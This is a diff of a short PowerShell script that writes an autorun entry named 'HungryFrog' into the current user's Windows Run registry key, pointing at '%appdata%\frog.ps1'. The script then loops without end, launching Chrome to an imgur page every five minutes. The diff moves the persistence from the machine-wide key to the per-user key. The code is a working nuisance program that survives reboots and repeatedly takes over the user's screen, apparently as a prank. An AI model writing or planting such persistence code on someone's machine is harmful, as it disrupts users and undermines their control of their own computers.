@@ -1,4 +1,4 @@
-$registryPath = 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
+$registryPath = 'Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
 $name = 'HungryFrog'
 $value = '%appdata%\\frog.ps1'
 
@@ -13,6 +13,8 @@ else
 }
 while(1 -eq 1)
 {
-  Start-Process -FilePath "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" -ArgumentList "https://imgur.com/RS2OVJf";
+  Start-Process -FilePath "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" -ArgumentList 
+
+"https://imgur.com/RS2OVJf";
   Start-Sleep -s 300;
 }
